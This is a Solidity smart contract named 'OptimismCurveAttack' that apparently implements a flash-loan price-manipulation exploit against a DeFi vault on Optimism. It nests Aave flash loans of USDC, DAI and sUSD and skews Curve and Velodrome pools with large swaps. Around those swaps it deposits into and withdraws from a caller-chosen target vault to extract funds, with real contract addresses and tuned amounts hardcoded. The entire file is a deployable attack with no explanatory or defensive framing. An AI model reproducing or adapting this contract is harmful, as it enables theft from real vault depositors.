// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IPool {
    function flashLoanSimple(
        address _receiverAddress,
        address _asset,
        uint256 _amount,
        bytes calldata _params,
        uint16 _referralCode
    ) external;
}

interface IPair {
    function swap(
        uint256 _amount0Out,
        uint256 _amount1Out,
        address _to,
        bytes calldata _data
    ) external;
}

interface IRouter {
    struct route {
        address _from;
        address _to;
        bool _stable;
    }

    function swapExactTokensForTokens(
        uint _amountIn,
        uint _amountOutMin,
        route[] calldata _routes,
        address _to,
        uint _deadline
    ) external returns (uint[] memory _amounts);
}

interface ICurve {
    function exchange_underlying(
        int128 _i,
        int128 _j,
        uint256 _dx,
        uint256 _min_dy
    ) external returns (uint256);
}

interface IArchimedes {
    function balance(uint256 _pid) external view returns (uint256);
    function balanceOf(uint256 _pid, address _user) external view returns (uint256);

    function deposit(
        uint _pid,
        uint _amount,
        address _referrer
    ) external;

    function withdrawAll(
        uint _pid
    ) external;
}

contract OptimismCurveAttack {
    using SafeERC20 for IERC20;

    IPool private _pool   = IPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    ICurve private _curve = ICurve(0x061b87122Ed14b9526A813209C8a59a633257bAb);

    address private _curveTC = 0x1337BedC9D22ecbe766dF105c9623922A27963EC;

    address private _usdc = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address private _dai  = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;
    address private _susd = 0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9;
    address private _usdt = 0x94b008aA00579c1307B0EF2c499aD98a8ce58e58;

    IRouter private _router = IRouter(0x9c12939390052919aF3155f41Bf4160Fd3666A6f);

    IArchimedes private _target;
    uint256 private _pid;

    function run(IArchimedes target_, uint256 pid_) public {
        _target = target_;
        _pid = pid_;

        _borrow(_usdc);
    }

    function executeOperation(
        address _asset,
        uint256 _amount,
        uint256 _premium,
        address, // initiator
        bytes memory
    ) public returns (bool) {
        require(
            _amount <= IERC20(_asset).balanceOf(address(this)),
            "Invalid balance for the contract"
        );

        // pay back the loan amount and the premium (flashloan fee)
        uint256 _amountToReturn = _amount + _premium;

        if (_asset == _usdc) {
            _borrow(_dai);
        } else if (_asset == _dai) {
            _borrow(_susd);
        } else if (_asset == _susd) {
            _swapUsdcToSusdOnVelodrome(5850004695000, 4527238373074563892960475);
            _swapAllSusdToUsdc();
            _swapAllDaiToUsdc();
            _deposit(899995304692);
            _swapUsdcToSusdOnCurve(5351764470016, 5355561201734932093551220);
            _swapUsdcToDai(1563670936932, 1562811714093903405861377);
            _withdrawAll();
            _swapUsdcToDai(232276355721, 232120211012624297605571);
        }

        if (_asset == _usdc) {
            _swapRemainingToUsdc(_dai);
            _swapRemainingToUsdc(_susd);
        }

        require(
            IERC20(_asset).balanceOf(address(this)) >= _amountToReturn,
            "Not enough amount to return loan"
        );

        IERC20(_asset).safeApprove(address(_pool), _amountToReturn);

        return true;
    }

    function _borrow(address _asset) private {
        if (_asset == _usdc) {
            _aaveFlashLoan(_asset, 6750000000000);
        } else if (_asset == _dai) {
            _aaveFlashLoan(_asset, 1789638812061673823444618);
        } else if (_asset == _susd) {
            _aaveFlashLoan(_asset, 831041014545983314426090);
        }
    }

    function _aaveFlashLoan(address _loanToken, uint256 _loanAmount) internal {
        _pool.flashLoanSimple(
            address(this),
            _loanToken,
            _loanAmount,
            "0x",
            0
        );
    }

    function _swapOnVelodrome(address _from, address _to, uint256 _amount, uint256 _expectedAmount) internal {
        IRouter.route[] memory _routes = new IRouter.route[](1);

        _routes[0] = IRouter.route({ _from: _from, _to: _to, _stable: true });

        IERC20(_from).safeApprove(address(_router), _amount);

        _router.swapExactTokensForTokens(
            _amount,
            _expectedAmount * 9999 / 10000,
            _routes,
            address(this),
            block.timestamp + 10
        );
    }

    function _swapUsdcToSusdOnVelodrome(uint256 _usdcAmount, uint256 _susdExpectedAmount) internal {
        _swapOnVelodrome(_usdc, _susd, _usdcAmount, _susdExpectedAmount);
    }

    function _swapSusdToUsdcOnVelodrome(uint256 _susdAmount, uint256 _usdcExpectedAmount) internal {
        _swapOnVelodrome(_susd, _usdc, _susdAmount, _usdcExpectedAmount);
    }

    function _swapAllSusdToUsdc() internal {
        uint256 _susdAmount = IERC20(_susd).balanceOf(address(this));

        IERC20(_susd).safeApprove(address(_curve), _susdAmount);

        _curve.exchange_underlying(0, 2, _susdAmount, 0);
    }

    function _swapAllDaiToUsdc() internal {
        uint256 _daiAmount = IERC20(_dai).balanceOf(address(this));

        IERC20(_dai).safeApprove(address(_curve), _daiAmount);

        _curve.exchange_underlying(1, 2, _daiAmount, 0);
    }

    function _swapRemainingToUsdc(address _asset) internal {
        uint256 _amount = IERC20(_asset).balanceOf(address(this));

        if (_asset == _dai) {
            IERC20(_dai).safeApprove(address(_curve), _amount);

            _curve.exchange_underlying(1, 2, _amount, 0);
        } else if (_asset == _susd) {
            IERC20(_susd).safeApprove(address(_curve), _amount);

            _swapSusdToUsdcOnVelodrome(_amount, 0);
        }
    }

    function _deposit(uint256 _amount) internal {
        IERC20(_usdc).safeApprove(address(_target), _amount);

        _target.deposit(_pid, _amount, address(0));
    }

    function _withdrawAll() internal {
        _target.balanceOf(_pid, address(this));

        _target.withdrawAll(_pid);
    }

    function _swapUsdcToSusdOnCurve(uint256 _usdcAmount, uint256 _susdExpectedAmount) internal {
        IERC20(_usdc).safeApprove(address(_curve), _usdcAmount);

        _curve.exchange_underlying(2, 0, _usdcAmount, _susdExpectedAmount * 9999 / 10000);
    }

    function _swapUsdcToDai(uint256 _usdcAmount, uint256 _daiExpectedAmount) internal {
        IERC20(_usdc).safeApprove(address(_curve), _usdcAmount);

        _curve.exchange_underlying(2, 1, _usdcAmount, _daiExpectedAmount * 9999 / 10000);
    }
}
